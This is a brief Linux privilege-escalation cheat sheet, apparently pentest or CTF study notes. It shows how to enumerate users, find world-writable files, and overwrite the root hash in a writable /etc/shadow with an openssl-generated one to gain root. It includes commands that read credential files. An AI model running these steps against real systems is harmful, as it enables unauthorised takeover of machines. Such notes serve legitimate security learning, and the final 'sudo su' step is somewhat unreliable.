**1.Weak Permissions**

_Exploit files or binaries that have weak permisions._

enumerate users on the system

```plaintext
cat /etc/passwd
```

enumerate groups

```plaintext
groups
cat etc/group
```

Search directories for files with permissions where all users can write or make changes to the file.

```plaintext
find / -not -type l -perm -o+w
```

Look for a file that can be useful in elevating privileges, like the ones in etc directory.

For example, if we find that we can write the shadow file, then we can overwrite the root password, resulting in eleveting our privileges.

To change the password we first need to hash it.

```plaintext
 openssl passwd -1 -salt abc mynewpassword
```

We can take the hashed password and put it in the shadow file, replacing \*.

now switch to the root using our password

```plaintext
sudo su
```
